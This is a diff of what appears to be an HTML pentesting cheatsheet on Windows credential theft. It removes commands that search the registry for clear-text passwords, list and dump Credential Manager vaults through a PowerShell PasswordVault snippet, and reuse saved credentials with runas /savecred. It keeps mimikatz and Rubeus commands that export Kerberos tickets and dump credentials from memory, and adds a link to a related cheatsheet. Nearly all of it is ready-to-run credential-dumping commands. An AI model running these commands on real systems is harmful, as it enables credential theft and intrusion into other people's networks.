@@ -978,41 +978,11 @@ sekurlsa::tickets<span class="w"> </span>/export
 Rubeus.exe<span class="w"> </span>harvest<span class="w"> </span>/interval:30
 </code></pre></div>
 <p>Note: <code>harvest</code> also automatically renews expiring tickets whilst <code>monitor</code> does not.</p>
-<p>Search for clear-text passwords in registers:</p>
-<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="w"> </span>/f<span class="w"> </span>password<span class="w"> </span>/t<span class="w"> </span>REG_SZ<span class="w"> </span>/s
-reg<span class="w"> </span>query<span class="w"> </span>HKCU<span class="w"> </span>/f<span class="w"> </span>password<span class="w"> </span>/t<span class="w"> </span>REG_SZ<span class="w"> </span>/s
-</code></pre></div>
-<p>where:</p>
-<ul>
-<li><code>/f</code> specifies the keyword to search in registers.</li>
-</ul>
-<p>Search credentials in the Windows Credentials Manager (<strong>password ARE NOT shown</strong>):</p>
-<div class="highlight"><pre><span></span><code><span class="c1"># list vaults</span>
-vaultcmd<span class="w"> </span>/list
-
-<span class="c1"># list properties of a vault</span>
-VaultCmd<span class="w"> </span>/listproperties:<span class="s2">"&lt;vault name&gt;"</span>
-
-<span class="c1"># list credentials in a vault</span>
-VaultCmd<span class="w"> </span>/listcreds:<span class="s2">"&lt;vault name&gt;"</span>
-</code></pre></div>
-<p>Dump credentials from the Windows Credentials Manager (see <a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1">there</a>):</p>
-<div class="highlight"><pre><span></span><code><span class="nv">$ClassHolder</span> <span class="p">=</span> <span class="p">[</span><span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">.</span><span class="n">PasswordVault</span><span class="p">,</span><span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">,</span><span class="n">ContentType</span><span class="p">=</span><span class="n">WindowsRuntime</span><span class="p">]</span>
-<span class="nv">$VaultObj</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">.</span><span class="n">PasswordVault</span>
-<span class="nv">$VaultObj</span><span class="p">.</span><span class="n">RetrieveAll</span><span class="p">()</span> <span class="p">|</span> <span class="k">foreach</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">RetrievePassword</span><span class="p">();</span> <span class="nv">$_</span> <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div>
-<p>List and use stored credentials with <code>runas</code>:</p>
-<div class="highlight"><pre><span></span><code><span class="c1"># List available stored credentials </span>
-cmdkey<span class="w"> </span>/list
-
-<span class="c1"># Use store credentials</span>
-runas<span class="w"> </span>/savecred<span class="w"> </span>/user:&lt;user<span class="w"> </span>listed<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>previous<span class="w"> </span>command&gt;<span class="w"> </span>cmd.exe
-</code></pre></div>
 <p>Dump Windows Credentials Manager's passwords from memory with <code>mimikatz</code>:</p>
 <div class="highlight"><pre><span></span><code>privilege::debug
 sekurlsa::credman
 </code></pre></div>
+<p><strong>Take also a look to <a href="https://ojack69.github.io/jacks-corner/privilege-escalation/windows-privilege-escalation-cheatsheet.html#dumping-credentials">Windows Privilege Escalation - Dumping Credentials</a>.</strong></p>
 <h3 id="pass-the-attacks">Pass-the-* attacks</h3>
 <p>Perform a pass-the-password attack:</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># Deprecated - Use netexec instead</span>
